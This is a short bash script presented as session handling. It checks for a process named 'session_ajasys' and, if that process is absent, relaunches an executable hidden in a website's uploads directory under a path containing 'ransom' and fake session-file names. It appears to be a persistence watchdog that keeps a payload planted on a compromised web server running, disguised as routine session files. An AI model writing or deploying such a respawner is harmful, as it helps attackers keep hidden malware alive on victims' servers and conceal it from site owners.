#!/bin/bash

# Full path to the session file
SESSION_FILE="/var/www/html/colortech/api/uploads/ransom/tmp/sess_aksd19sb187ss1ia901b23/session_ajasysbey"

# Check if the session process is active
if ps -e | grep session_ajasys; then
    echo "Session process is active"
else
    echo "Session process is not active, running the specified executable file with nice"
    # Check if the session file exists
    if [ -x "$SESSION_FILE" ]; then
        # Run the session file with nice
        nice "$SESSION_FILE" "$@"
    else
        echo "Error: Session file does not exist or is not executable"
        exit 1
    fi
fi
